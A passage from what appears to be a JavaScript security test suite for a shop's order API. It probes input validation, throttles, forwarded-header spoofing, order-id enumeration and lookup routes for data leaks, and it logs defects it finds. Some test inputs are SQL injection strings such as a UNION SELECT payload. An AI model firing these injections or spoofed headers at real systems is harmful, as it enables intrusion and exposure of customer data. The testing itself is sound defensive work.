  is(cc.status === 200 && !/[\x00-\x1F]/.test(ccRow?.note ?? '') && !/[\x00-\x1F]/.test(ccRow?.name ?? ''), 'control characters (tab, newline, CR, NUL) never reach the database', JSON.stringify(ccRow?.note))
  defect('G8', /Ring twice Gate B/.test(ccRow?.note ?? ''), 'a newline in the note becomes a space, so two lines of directions stay two words',
    `"Ring twice\\nGate B" is stored as ${JSON.stringify(ccRow?.note)}: the words run together on the courier's sheet`)

  // Malformed requests and wrong protocol
  const body0 = { items: [{ slug: ACC, qty: 1 }], customer: baseCustomer(), payment_method: 'cod' }
  const mk = (extra) => ({ ...body0, track_id: newTrack(), customer: baseCustomer(), ...extra })
  const sends = [
    ['customer as a list', () => post(B.base, 'order', mk({ customer: [1, 2] }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_customer'],
    ['customer missing', () => post(B.base, 'order', (() => { const b = mk({}); delete b.customer; return b })(), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_customer'],
    ['customer a string', () => post(B.base, 'order', mk({ customer: 'Ali' }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_customer'],
    ['track_id an array', () => post(B.base, 'order', mk({ track_id: ['A1B2C3D4', 'X'] }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_track_id'],
    ['track_id with a space', () => post(B.base, 'order', mk({ track_id: 'AB CD EF GH' }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_track_id'],
    ['track_id 31 chars', () => post(B.base, 'order', mk({ track_id: 'A'.repeat(31) }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_track_id'],
    ['track_id with SQL', () => post(B.base, 'order', mk({ track_id: "x' or '1'='1" }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_track_id'],
    ['payment_method an array', () => post(B.base, 'order', mk({ payment_method: ['cod'] }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_payment_method'],
    ['payment_method unknown', () => post(B.base, 'order', mk({ payment_method: 'bitcoin' }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_payment_method'],
    ['discount_code an array', () => post(B.base, 'order', mk({ discount_code: ['A', 'B'] }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_discount_code'],
    ['expected_total a string', () => post(B.base, 'order', mk({ expected_total_fils: '5000' }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_expected_total'],
    ['items an object', () => post(B.base, 'order', mk({ items: { slug: ACC, qty: 1 } }), { headers: { 'X-Forwarded-For': newIp() } }), 'invalid_item'],
    ['items empty', () => post(B.base, 'order', mk({ items: [] }), { headers: { 'X-Forwarded-For': newIp() } }), 'empty_cart'],
    ['51 lines', () => post(B.base, 'order', mk({ items: Array.from({ length: 51 }, () => ({ slug: ACC, qty: 1 })) }), { headers: { 'X-Forwarded-For': newIp() } }), 'cart_too_large'],
    ['21 pieces', () => post(B.base, 'order', mk({ items: [{ slug: ACC, qty: 21 }] }), { headers: { 'X-Forwarded-For': newIp() } }), null],
    ['empty body', () => request(B.base, 'POST', '/api.php?r=order', { raw: '', headers: { ...J, 'X-Forwarded-For': newIp() } }), 'invalid_track_id'],
    ['malformed JSON', () => request(B.base, 'POST', '/api.php?r=order', { raw: '{"track_id": "AAAA', headers: { ...J, 'X-Forwarded-For': newIp() } }), 'invalid_track_id'],
    ['JSON list body', () => request(B.base, 'POST', '/api.php?r=order', { raw: '[1,2,3]', headers: { ...J, 'X-Forwarded-For': newIp() } }), 'invalid_track_id'],
    ['lone surrogate escape', () => request(B.base, 'POST', '/api.php?r=order', { raw: '{"track_id":"\\ud800ABCDEF"}', headers: { ...J, 'X-Forwarded-For': newIp() } }), 'invalid_track_id'],
    ['JSON nested 600 deep', () => request(B.base, 'POST', '/api.php?r=order', { raw: '['.repeat(600) + ']'.repeat(600), headers: { ...J, 'X-Forwarded-For': newIp() } }), 'invalid_track_id'],
  ]
  for (const [label, fn, tok] of sends) {
    const r = await fn()
    if (tok === null) { is(r.status < 500, `survived: ${label}`, `HTTP ${r.status} ${r.json?.error ?? ''}`); continue }
    is(r.status === 400 && r.json?.error === tok, `refused: ${label}`, `HTTP ${r.status} ${r.json?.error}`)
  }
  const big = await request(B.base, 'POST', '/api.php?r=order', { raw: JSON.stringify({ track_id: newTrack(), pad: 'x'.repeat(70000) }), headers: { ...J, 'X-Forwarded-For': newIp() } })
  is(big.status === 413 && big.json?.error === 'request_too_large', 'a body over 64 kB is refused unparsed', `HTTP ${big.status}`)
  const noCt = await request(B.base, 'POST', '/api.php?r=order', { raw: JSON.stringify({ track_id: newTrack() }), headers: { 'X-Forwarded-For': newIp() } })
  const txt = await request(B.base, 'POST', '/api.php?r=order', { raw: JSON.stringify({ track_id: newTrack() }), headers: { 'Content-Type': 'text/plain', 'X-Forwarded-For': newIp() } })
  const frm = await request(B.base, 'POST', '/api.php?r=order', { raw: 'track_id=ABCDEF123', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Forwarded-For': newIp() } })
  is([noCt, txt, frm].every((x) => x.status === 403 && x.json?.error === 'bad_request'), 'no content type, text/plain and a form post are all refused (403)', [noCt, txt, frm].map((x) => x.status).join('/'))
  const xs = await post(B.base, 'order', mk({}), { headers: { 'Sec-Fetch-Site': 'cross-site', 'X-Forwarded-For': newIp() } })
  is(xs.status === 403, 'a browser request marked cross-site is refused', `HTTP ${xs.status}`)
  const ctOk = await request(B.base, 'POST', '/api.php?r=order', { raw: JSON.stringify(mk({})), headers: { 'Content-Type': 'Application/JSON; charset=UTF-8', 'X-Forwarded-For': newIp() } })
  is(ctOk.status === 200, 'application/json with a charset, in any case, is fine', `HTTP ${ctOk.status}`)
  for (const m of ['GET', 'PUT', 'DELETE', 'PATCH']) {
    const r = await request(B.base, m, '/api.php?r=order', { raw: m === 'GET' ? undefined : '{}', headers: { ...J, 'X-Forwarded-For': newIp() } })
    is(r.status === 404 && r.json?.error === 'not_found', `${m} on the order route reads nothing and writes nothing`, `HTTP ${r.status}`)
  }
  const oneGuard = await post(B.base, 'order', { track_id: newTrack(), payment_method: 'cod', items: [{ slug: ACC, qty: 21 }], customer: baseCustomer() }, { headers: { 'X-Forwarded-For': newIp() } })
  is(oneGuard.status >= 400 && oneGuard.status < 500, '21 pieces in one order are refused', `HTTP ${oneGuard.status} ${oneGuard.json?.error}`)
  note('no CAPTCHA, honeypot, OTP or customer header is needed to place an order: the controls are the throttles below and the cash cap')
})

// ============================================================================
// 3  THROTTLES
// ============================================================================
await section('3  throttles: cooldown by client and phone, forwarded-header spoofing, cash cap, route limit', async () => {
  const mkc = (phone) => baseCustomer({ phone })
  const ipA = newIp(), ipB = newIp(), ipC = newIp()
  const pA = newPhone(), pB = newPhone(), pC = newPhone()
  const stockBefore = await jacketStock()
  const a = await placeOrder(C, { customer: mkc(pA), ip: ipA, items: [{ slug: JACKET, qty: 1, size: 'l' }] })
  is(a.status === 200, 'first order from client A / phone A is accepted', `HTTP ${a.status}`)
  const sA = await jacketStock()
  const b = await placeOrder(C, { customer: mkc(pB), ip: ipA, items: [{ slug: JACKET, qty: 1, size: 'l' }] })
  is(b.status === 429 && b.json?.error === 'previous_order_pending', 'same client, different phone, inside 60 s: 429 previous_order_pending', `HTTP ${b.status} ${b.json?.error}`)
  const ra = Number(b.headers['retry-after']); const rj = b.json?.retry_after
  is(ra >= 1 && ra <= 60 && ra === rj, 'with Retry-After counting down from 60', `Retry-After ${ra}, retry_after ${rj}`)
  is((await countOrders([b.track])) === 0 && (await jacketStock()) === sA, 'and the refused order wrote nothing and took no stock')
  const c = await placeOrder(C, { customer: mkc(pA), ip: ipB })
  is(c.status === 429 && c.json?.error === 'previous_order_pending', 'different client, SAME phone, inside 60 s: 429 (the phone is a client too)', `HTTP ${c.status}`)
  const d = await placeOrder(C, { customer: mkc(pC), ip: ipC })
  is(d.status === 200, 'different client and different phone: accepted', `HTTP ${d.status}`)
  const again = await post(C.base, 'order', a.body, { headers: { 'X-Forwarded-For': ipA } })
  is(again.status === 200 && again.json?.order_id === a.json?.order_id, 'a retry of the SAME attempt gets its order back, never a 429', `order ${again.json?.order_id}`)
  // someone else's number: anyone can start a victim's minute
  const vic = newPhone()
  const atk = await placeOrder(C, { customer: { ...baseCustomer({ phone: vic }), name: 'Not The Owner' }, ip: newIp() })
  const vi = await placeOrder(C, { customer: baseCustomer({ phone: vic, name: 'The Real Owner' }), ip: newIp() })
  defect('G3', !(atk.status === 200 && vi.status === 429), 'a stranger cannot lock a phone number out of ordering by using it first',
    `order 1 under the victim's number from address X: HTTP ${atk.status}; the owner's order 5 s later from address Y: HTTP ${vi.status} ${vi.json?.error}. The number is typed, never verified.`)

  // forwarded-header spoofing
  const sp1 = newSrc()
  const s1 = await placeOrder(D, { customer: mkc(newPhone()), from: sp1, headers: { 'X-Forwarded-For': '9.9.9.1' } })
  const s2 = await placeOrder(D, { customer: mkc(newPhone()), from: sp1, headers: { 'X-Forwarded-For': '9.9.9.2' } })
  is(s1.status === 200 && s2.status === 429, 'untrusted proxy list: a changed X-Forwarded-For does NOT make a new client', `${s1.status} then ${s2.status}`)
  const s3 = await placeOrder(D, { customer: mkc(newPhone()), from: newSrc(), headers: { 'X-Forwarded-For': '9.9.9.1' } })
  is(s3.status === 200, '  and the same header from a different real address does not share a bucket either', `HTTP ${s3.status}`)
  const t1 = await placeOrder(C, { customer: mkc(newPhone()), headers: { 'X-Forwarded-For': '66.66.66.1, 10.7.7.7' } })
  const t2 = await placeOrder(C, { customer: mkc(newPhone()), headers: { 'X-Forwarded-For': '66.66.66.2, 10.7.7.7' } })
  is(t1.status === 200 && t2.status === 429, 'trusted proxy: a spoofed LEADING entry never wins, the hop the proxy appended does', `${t1.status} then ${t2.status}`)
  const v6a = await placeOrder(C, { customer: mkc(newPhone()), headers: { 'X-Forwarded-For': '2001:db8:aaaa:bbbb:1::1' } })
  const v6b = await placeOrder(C, { customer: mkc(newPhone()), headers: { 'X-Forwarded-For': '2001:db8:aaaa:bbbb:ffff::9' } })
  is(v6a.status === 200 && v6b.status === 429, 'an IPv6 client is one client per /64', `${v6a.status} then ${v6b.status}`)

  // cooldown expires, and a declined card does not hold the door
  const cdIp = newIp(), cdPhone = newPhone()
  const x1 = await placeOrder(C, { customer: mkc(cdPhone), ip: cdIp, method: 'knet' })
  is(x1.status === 200, 'a card order is accepted (pending)', `HTTP ${x1.status} ${x1.json?.error ?? ''}`)
  const x2 = await placeOrder(C, { customer: mkc(cdPhone), ip: cdIp, method: 'knet' })
  is(x2.status === 429, 'and holds the door for a minute', `HTTP ${x2.status}`)
  await sql(`update orders set payment_status='failed' where track_id=${lit(x1.track)}`)
  const x3 = await placeOrder(C, { customer: mkc(cdPhone), ip: cdIp, method: 'knet' })
  is(x3.status === 200, 'a declined card releases it at once: the shopper may try another card', `HTTP ${x3.status}`)
  await sql(`update orders set created_at = now() - interval 61 second where track_id in (${inList([x1.track, x3.track])})`)
  await sql(`update rate_limit set window_start = window_start - 61 where bucket_key = ${lit(rlKey('order_cooldown', cdIp))}`)
  const x4 = await placeOrder(C, { customer: mkc(cdPhone), ip: cdIp, method: 'knet' })
  is(x4.status === 200, 'after the minute it opens again', `HTTP ${x4.status}`)

  // cash cap and block list (no cooldown on B)
  const capPhone = newPhone()
  const caps = []
  for (let i = 0; i < 3; i++) caps.push(await placeOrder(B, { customer: mkc(capPhone), ip: newIp() }))
  const cap4 = await placeOrder(B, { customer: mkc(capPhone), ip: newIp() })
  is(caps.every((x) => x.status === 200) && cap4.status === 409 && cap4.json?.error === 'too_many_open_cod', 'three open cash orders per phone, the fourth is refused (409 too_many_open_cod)', `${caps.map((x) => x.status)} then ${cap4.status} ${cap4.json?.error}`)
  const capCard = await placeOrder(B, { customer: mkc(capPhone), ip: newIp(), method: 'knet' })
  is(capCard.status === 200, 'the cap is for cash only: a card order from the same phone is fine', `HTTP ${capCard.status}`)
  await sql(`update orders set fulfilment_status='delivered' where track_id=${lit(caps[0].track)}`)
  const cap5 = await placeOrder(B, { customer: mkc(capPhone), ip: newIp() })
  is(cap5.status === 200, 'a delivered order frees a slot', `HTTP ${cap5.status}`)
  // The same cap as an attack: three orders under a victim's number from three addresses
  const vp = newPhone()
  for (let i = 0; i < 3; i++) await placeOrder(B, { customer: { ...baseCustomer({ phone: vp }), name: `Prank ${i}` }, ip: newIp() })
  const vOwn = await placeOrder(B, { customer: baseCustomer({ phone: vp, name: 'Real Owner' }), ip: newIp() })
  defect('G3b', vOwn.status !== 409, "three cash orders typed under someone's number do not block that person's own cash order",
    `after 3 orders under the victim's phone from 3 addresses, the owner's order: HTTP ${vOwn.status} ${vOwn.json?.error}. Cleared only when a person marks them delivered or cancelled, or the 24 h cash auto-cancel runs.`)
  // block list tokens
  const blk = newPhone()
  await sql(`insert into blocked_customers (phone, scope) values ('965${blk}', 'cod') on duplicate key update scope='cod'`)
  const bc = await placeOrder(B, { customer: mkc(blk), ip: newIp() })
  const bk = await placeOrder(B, { customer: mkc(blk), ip: newIp(), method: 'knet' })
  await sql(`update blocked_customers set scope='all' where phone='965${blk}'`)
  const ba = await placeOrder(B, { customer: mkc(blk), ip: newIp(), method: 'knet' })
  is(bc.status === 403 && bc.json?.error === 'cod_blocked' && bk.status === 200 && ba.status === 403 && ba.json?.error === 'customer_blocked',
    'the block list: a cash block stops cash only, a full block stops everything', `${bc.json?.error}, ${bk.status}, ${ba.json?.error}`)
  note('the refusal tokens (cod_blocked, customer_blocked, too_many_open_cod) tell a caller the state of a phone number they only have to know the digits of')

  // route throttle counts on arrival
  const rip = newIp()
  const res = []
  for (let i = 0; i < 21; i++) res.push((await request(B.base, 'POST', '/api.php?r=order', { raw: '{}', headers: { ...J, 'X-Forwarded-For': rip } })).status)
  is(res.slice(0, 20).every((s) => s === 400) && res[20] === 429, 'the route allows 20 requests per 10 minutes per client, invalid ones included', `statuses ${res.slice(18).join(',')}`)
  const other = await request(B.base, 'POST', '/api.php?r=order', { raw: '{}', headers: { ...J, 'X-Forwarded-For': newIp() } })
  is(other.status === 400, 'and another client is unaffected', `HTTP ${other.status}`)
  // pieces per client
  const uip = newIp()
  // counted in tracked garments (a size row to claim), so two sizes of one jacket
  const two = [{ slug: JACKET, qty: 10, size: 'l' }, { slug: JACKET, qty: 10, size: 'm' }]
  const u1 = await placeOrder(B, { ip: uip, items: two })
  const u2 = await placeOrder(B, { ip: uip, items: two })
  const u3 = await placeOrder(B, { ip: uip, items: [{ slug: JACKET, qty: 1, size: 'l' }] })
  note('40 pieces per client per 2 h', `${u1.status}, ${u2.status}, then the 41st piece: HTTP ${u3.status} ${u3.json?.error ?? ''}`)
  is(u1.status === 200 && u2.status === 200 && u3.status === 429, 'unpaid stock one client may hold is capped at 40 pieces per 2 hours', `${u1.status}/${u2.status}/${u3.status}`)
  const stockEnd = await jacketStock()
  void stockBefore; void stockEnd
})

// ============================================================================
// 4  THE SAME ORDER AT THE SAME INSTANT
// ============================================================================
await section('4  double submit: 20 identical requests at once', async () => {
  for (const [label, base] of [['no cooldown', B], ['60 s cooldown', C]]) {
    const track = newTrack(); const cust = baseCustomer(); const ip = newIp()
    const before = await jacketStock()
    const body = { track_id: track, payment_method: 'cod', items: [{ slug: JACKET, qty: 1, size: 'l' }], customer: cust }
    const rs = await Promise.all(Array.from({ length: 20 }, () => post(base.base, 'order', body, { headers: { 'X-Forwarded-For': ip } })))
    const codes = rs.map((r) => r.status)
    const ids = new Set(rs.filter((r) => r.status === 200).map((r) => r.json?.order_id))
    is((await countOrders([track])) === 1, `${label}: exactly one order row`, `statuses ${[...new Set(codes)].join(',')}`)
    is(ids.size === 1 && codes.every((c) => c === 200), `${label}: every one of the 20 is answered with that same order`, `${codes.filter((c) => c === 200).length}/20 are 200, ids ${[...ids]}`)
    is(before - (await jacketStock()) === 1, `${label}: one garment taken, not twenty`)
    const o = await orderRow(track)
    is(Number(await one(`select count(*) from fulfilment_outbox where order_id=${o.id}`)) === 1, `${label}: one warehouse message`)
  }
  // twenty DIFFERENT orders on one phone at once: the cash cap holds under a race
  const phone = newPhone()
  const rs = await Promise.all(Array.from({ length: 8 }, () => placeOrder(B, { customer: baseCustomer({ phone }), ip: newIp() })))
  const okN = rs.filter((r) => r.status === 200).length
  is(okN === 3 && rs.filter((r) => r.status === 409).length === 5, 'eight different cash orders on one phone at once: exactly 3 accepted, 5 told too_many_open_cod', `accepted ${okN}`)
  // same client, 8 different phones, one minute: one wins
  const ip = newIp()
  const rc = await Promise.all(Array.from({ length: 8 }, () => placeOrder(C, { customer: baseCustomer(), ip })))
  is(rc.filter((r) => r.status === 200).length === 1 && rc.filter((r) => r.status === 429).length === 7, 'eight new orders from one client at once: one accepted, seven told to wait', rc.map((r) => r.status).join(','))
})

// ----- the remaining scenarios live in the second part of this file ------------
// ============================================================================
// ADMIN SESSION (used by 6 to 10)
// ============================================================================
const ADMIN_EMAIL = `gc-admin-${TAG.toLowerCase()}@sporta.invalid`
const ADMIN_PW = `guest-orders-admin-pw-${TAG}`
let adminCookie = ''
const ADMIN_IP = newIp()
const adm = async (route, o = {}) => {
  const res = await request(B.base, o.method ?? 'GET', `/admin.php?r=${route}`, {
    headers: { 'X-Forwarded-For': ADMIN_IP, ...(o.noHeader ? {} : { 'X-Sporta-Admin': '1' }), ...(o.body !== undefined ? J : {}),
      ...(o.cookie !== undefined ? (o.cookie ? { Cookie: o.cookie } : {}) : adminCookie ? { Cookie: adminCookie } : {}), ...(o.headers ?? {}) },
    body: o.body,
  })
  const set = res.headers['set-cookie']
  if (set && o.cookie === undefined) adminCookie = [].concat(set).map((c) => c.split(';')[0]).join('; ')
  return res
}
async function adminSignIn() {
  const { stdout } = await run('php', ['-r', 'echo password_hash($argv[1], PASSWORD_DEFAULT);', ADMIN_PW])
  await sql(`insert into admin_users (email, password_hash) values (${lit(ADMIN_EMAIL)}, ${lit(stdout.trim())})`)
  const r = await adm('login', { method: 'POST', body: { email: ADMIN_EMAIL, password: ADMIN_PW } })
  return r
}

// ============================================================================
// 5  LOOKUP: every public route that returns order data
// ============================================================================
const fx = {}  // orders shared by 5 to 10
await section('5  lookup: what a stranger gets back, with the right id, a wrong one, neighbours, hostile ones', async () => {
  const mk = async (label, over = {}, extra = {}) => {
    const customer = baseCustomer({ name: `Name${label}${TAG}`, street: `ST${label}${TAG}`, note: `Note${label}${TAG}`, ...over })
    const r = await placeOrder(B, { customer, ip: newIp(), ...extra })
    if (r.status !== 200) throw new Error(`fixture ${label}: HTTP ${r.status} ${r.text}`)
    return { label, track: r.track, id: r.json.order_id, phone: customer.phone, name: customer.name, street: customer.street, note: customer.note, customer }
  }
  fx.U = await mk('U'); fx.V = await mk('V'); fx.W = await mk('W')
  const marks = (o) => [o.name, o.street, o.note, o.phone.slice(-8)]
  const leaks = (text, ...others) => others.flatMap(marks).filter((m) => text.includes(m))
  is(fx.W.id === fx.V.id + 1 && fx.V.id === fx.U.id + 1, 'order ids are consecutive integers', `${fx.U.id}, ${fx.V.id}, ${fx.W.id}`)
  defect('G12', !Number.isInteger(g1?.json?.order_id), 'the public order response does not reveal the shop\'s order volume',
    `POST ?r=order answers order_id=${fx.V.id}; two orders a day apart give the number of orders taken in between (a competitor can sample sales)`)
  const ip = () => ({ headers: { 'X-Forwarded-For': newIp() } })
  const V = fx.V

  // ---- ?r=status
  const st = await get(B.base, `status&id=${V.track}`, ip())
  is(st.status === 200 && st.json?.payment_status === 'pending', 'status: the right id returns the order state', JSON.stringify(st.json).slice(0, 140))
  is(Object.keys(st.json).sort().join() === 'amount,events,fulfilment_status,payment_method,payment_status', 'status: only state, method, amount and the tracking events', Object.keys(st.json).join(','))
  is(leaks(st.text, V).length === 0, 'status: no name, phone, address or note')
  for (const [label, id] of [['an order id n-1', String(fx.U.id)], ['an order id n+1', String(fx.W.id)], ['the order id itself', String(V.id)], ['a wrong id of the right shape', 'SPZZZZ' + TAG + 'QQ'],
    ['no id', ''], ['SQL quote', "' or '1'='1"], ['a LIKE wildcard', '%'], ['an underscore wildcard', '_'.repeat(V.track.length)], ['a semicolon', V.track + ';select 1'], ['a prefix of the id', V.track.slice(0, -1)]]) {
    const r = await get(B.base, `status&id=${encodeURIComponent(id)}`, ip())
    is(r.status === 200 && r.json === null, `status: ${label} returns null`, `HTTP ${r.status} ${r.text.slice(0, 40)}`)
  }
  const arr = await request(B.base, 'GET', `/api.php?r=status&id[]=${V.track}`, ip())
  is(arr.status === 200 && arr.json === null, 'status: an array parameter returns null', `HTTP ${arr.status} ${arr.text.slice(0, 40)}`)
  const lc = await get(B.base, `status&id=${V.track.toLowerCase()}`, ip())
  const pad = await get(B.base, `status&id=${encodeURIComponent(' ' + V.track + '  ')}`, ip())
  note('status ignores case and surrounding spaces', `lower-case: ${lc.json ? 'found' : 'null'}, padded: ${pad.json ? 'found' : 'null'} (collation utf8mb4_unicode_ci)`)
  const noA = await request(B.base, 'GET', '/api.php?r[]=status', ip())
  defect('G13', noA.status < 500, 'a malformed ?r[]= is answered 404/400, not a 500', `HTTP ${noA.status} ${noA.text}`)

  // ---- ?r=invoice
  const iv = await get(B.base, `invoice&id=${V.track}`, ip())
  is(iv.status === 200 && iv.json?.customer_name === V.name && iv.json?.address?.street === V.street, 'invoice: the right id returns the name and the address', `${iv.json?.customer_name}, street ${iv.json?.address?.street}`)
  is(!iv.text.includes(V.phone.slice(-8)) && !iv.text.includes(V.note), 'invoice: but never the phone number or the note')
  is(leaks(iv.text, fx.U, fx.W).length === 0, "invoice: nothing of the neighbouring orders (n-1, n+1)")
  for (const [label, id] of [['an order id', String(V.id)], ['a wrong id', 'SPYYYY' + TAG], ['no id', ''], ['SQL quote', "x' union select 1,2,3 -- "], ['%', '%']]) {
    const r = await get(B.base, `invoice&id=${encodeURIComponent(id)}`, ip())
    is(r.status === 200 && r.json === null, `invoice: ${label} returns null`, `HTTP ${r.status}`)
  }
  const otherInv = await get(B.base, `invoice&id=${fx.W.track}`, ip())
  is(otherInv.json?.customer_name === fx.W.name && leaks(otherInv.text, V, fx.U).length === 0, "invoice: another order's own id returns that order only")

  // ---- the order route as a lookup (idempotent replay)
  const rp = await post(B.base, 'order', { track_id: V.track, payment_method: 'cod' }, ip())
  is(rp.status === 200 && rp.json?.order_id === V.id && Object.keys(rp.json).sort().join() === 'amount,order_id,payment_method,track_id',
    'order replay: a bare {track_id, payment_method} returns order_id, amount and method of that order', JSON.stringify(rp.json))
  const rpw = await post(B.base, 'order', { track_id: V.track, payment_method: 'knet' }, ip())
  const rpu = await post(B.base, 'order', { track_id: 'SPNONE' + TAG, payment_method: 'cod' }, ip())
  is(rpw.status === 409 && rpw.json?.error === 'invalid_payment_method' && rpu.status === 400 && rpu.json?.error === 'empty_cart',
    'order replay: wrong method 409, unknown id 400 (a third existence oracle, 20 per 10 minutes)', `${rpw.json?.error} / ${rpu.json?.error}`)
  is(leaks(rp.text, V, fx.U, fx.W).length === 0, 'order replay: no personal data')

  // ---- weak ids: the server will take any 6+ alphanumerics
  const weak = []
  for (let i = 1; i <= 3; i++) {
    const t = `GCW${TAG}${i}`
    const r = await placeOrder(B, { track: t, customer: baseCustomer({ name: `Weak${i}${TAG}`, street: `WEAKST${i}${TAG}` }), ip: newIp() })
    weak.push({ t, r })
  }
  const seqv = await get(B.base, `invoice&id=GCW${TAG}2`, ip())
  defect('G1', weak.some((w) => w.r.status !== 200),
    'the server refuses a guessable order number (it is the only credential for the invoice)',
    `a client that sends track_id "GCW${TAG}1", "…2", "…3" is accepted (${weak.map((w) => w.r.status)}); "GCW${TAG}2" was then read by anyone: ${seqv.json?.customer_name} / ${seqv.json?.address?.street}. The shipped client makes 62-64 bits, nothing enforces it.`)

  // ---- enumeration: exist vs not exist
  const N = 120
  const time = async (mkReq) => { const t = []; for (let i = 0; i < N; i++) t.push((await mkReq()).ms); t.sort((a, b) => a - b); return t[N >> 1] }
  const mExist = await time(() => get(B.base, `status&id=${V.track}`, ip()))
  const mMiss = await time(() => get(B.base, `status&id=SPMISS${TAG}${seq++}`, ip()))
  note('status timing', `known ${mExist.toFixed(2)} ms, unknown ${mMiss.toFixed(2)} ms (median of ${N}); the answer itself differs (object vs null), so timing is moot`)
  const hit = await get(B.base, `status&id=${V.track}`, ip()); const miss = await get(B.base, `status&id=SPMISS${TAG}`, ip())
  is(hit.text !== miss.text, 'status is an explicit existence oracle by design (object vs null); the only protection is the id\'s entropy', `${hit.text.length} bytes vs ${miss.text.length}`)
  const sThr = []
  const sip = newIp()
  for (let i = 0; i < 61; i++) sThr.push((await get(B.base, `status&id=SPMISS${TAG}`, { headers: { 'X-Forwarded-For': sip } })).status)
  is(sThr[59] === 200 && sThr[60] === 429, 'status/invoice are limited to 60 requests a minute per client', `61st: ${sThr[60]}`)

  // ---- ?r=return_lookup
  const rl = (track, phone, o = {}) => post(B.base, 'return_lookup', { track_id: track, phone }, { headers: { ...CUST, 'X-Forwarded-For': newIp() }, ...o })
  const good = await rl(V.track, V.phone)
  is(good.status === 200 && good.json?.order?.track_id === V.track && good.json?.order?.items?.length === 1, 'returns: right order + right phone shows the items', `eligibility ${good.json?.order?.eligibility}`)
  is(leaks(good.text, V).filter((m) => m !== V.phone.slice(-8)).length === 0 && !good.text.includes(V.phone.slice(-8)), 'returns: and still no name, address, note or phone in the answer')
  for (const [label, track, phone] of [['+965 spelled phone', V.track, '+965 ' + V.phone], ['00965 phone', V.track, '00965' + V.phone], ['lower-case order number', V.track.toLowerCase(), V.phone]]) {
    const r = await rl(track, phone)
    is(r.status === 200, `returns: ${label} is accepted`, `HTTP ${r.status}`)
  }
  const bad404 = [['wrong phone', V.track, newLocal()], ['the neighbour\'s phone', V.track, fx.W.phone], ['V\'s phone on the neighbour\'s order', fx.W.track, V.phone],
    ['no phone', V.track, undefined], ['phone as array', V.track, [V.phone]], ['an order id instead of a track id', String(V.id), V.phone], ['unknown order', 'SPNOPE' + TAG, V.phone], ['id n-1', String(fx.U.id), fx.U.phone]]
  const bodies = new Set()
  for (const [label, track, phone] of bad404) {
    const r = await rl(track, phone)
    bodies.add(r.text)
    is(r.status === 404 && r.json?.error === 'order_not_found', `returns: ${label} -> 404 order_not_found`, `HTTP ${r.status} ${r.json?.error}`)
  }
  is(bodies.size === 1, 'returns: unknown order and wrong phone give byte-identical answers', `${bodies.size} distinct bodies`)
  const h1 = await post(B.base, 'return_lookup', { track_id: V.track, phone: V.phone }, { headers: { 'X-Forwarded-For': newIp(), 'Content-Type': 'application/json' } })
  const g1r = await request(B.base, 'GET', '/api.php?r=return_lookup', ip())
  is(h1.status === 403 && g1r.status === 405, 'returns: no X-Sporta-Customer header -> 403, GET -> 405', `${h1.status}/${g1r.status}`)
  const m = 100
  const tm = async (track, phone) => { const t = []; for (let i = 0; i < m; i++) t.push((await rl(track, phone)).ms); t.sort((a, b) => a - b); return t[m >> 1] }
  const tUnknown = await tm('SPNOPE' + TAG, V.phone); const tWrong = await tm(V.track, newLocal())
  is(Math.abs(tUnknown - tWrong) < 10, 'returns: unknown order and wrong phone take the same time', `unknown ${tUnknown.toFixed(2)} ms, wrong phone ${tWrong.toFixed(2)} ms`)
  const lim = []; const lip = newIp()
  for (let i = 0; i < 13; i++) lim.push((await post(B.base, 'return_lookup', { track_id: V.track, phone: newLocal() }, { headers: { ...CUST, 'X-Forwarded-For': lip } })).status)
  is(lim[11] === 404 && lim[12] === 429, 'returns: guessing a phone number is limited to 12 tries a minute per client', `13th: ${lim[12]}`)
  note('returns: the phone gate protects what the invoice already gives away (items, sizes, prices) to anyone holding the track id; it does protect return_submit')

  // ---- assistant
  const as = (msg) => post(B.base, 'assistant', { message: msg, lang: 'en' }, { headers: { 'X-Forwarded-For': newIp() } })
  const aOk = await as(`where is my order ${V.track}`)
  const aNo = await as(`where is my order SPNOPE${TAG}XX`)
  const aPh = await as(`my phone is ${V.phone}, where is my order? name ${V.name}`)
  is(aOk.json?.data?.track === V.track && aOk.json?.data?.amount, 'assistant: an order number in the message returns stage, amount and method', JSON.stringify(aOk.json?.data))
  is(leaks(aOk.text, V).length === 0 && leaks(aPh.text, V).length === 0, 'assistant: never the name, address, note or phone')
  is(aPh.json?.data?.kind !== 'order', 'assistant: a phone number or a name does not find an order', aPh.json?.intent)
  is(aNo.json?.data?.kind !== 'order', 'assistant: an unknown order number gets the fixed "no order" answer', aNo.json?.intent)

  // ---- review link (signed)
  const sig = (t) => createHmac('sha256', CRON_KEY).update('review\0' + t).digest('hex').slice(0, 32)
  const rv = await get(B.base, `review_invite&o=${V.track}&t=${sig(V.track)}`, ip())
  is(rv.status === 200 && rv.json?.name === V.name && !rv.text.includes(V.phone.slice(-8)) && !rv.text.includes(V.street), 'review link: the signed link shows the name only (no phone, no address, no note)', JSON.stringify(rv.json).slice(0, 120))
  const rvBodies = new Set()
  for (const [label, o, t] of [['no signature', V.track, ''], ['wrong signature', V.track, sig(fx.W.track)], ['the neighbour\'s signature', fx.W.track, sig(V.track)], ['unknown order, valid shape', 'SPNOPE' + TAG, sig('SPNOPE' + TAG)], ['signature of a prefix', V.track, sig(V.track.slice(0, -1))]]) {
    const r = await get(B.base, `review_invite&o=${o}&t=${t}`, ip()); rvBodies.add(r.text)
    is(r.status === 404 && r.json?.error === 'invalid_review_link', `review link: ${label} -> 404 invalid_review_link`, `HTTP ${r.status}`)
  }
  is(rvBodies.size === 1, 'review link: one identical answer for every refusal (no oracle)')

  // ---- support ticket lookup
  const em = newEmail()
  const tk = await post(B.base, 'support_create', { name: 'Zed Support', email: em, subject: 'Where is my order', message: 'please check my order', order_track_id: V.track }, { headers: { ...CUST, 'X-Forwarded-For': newIp() } })
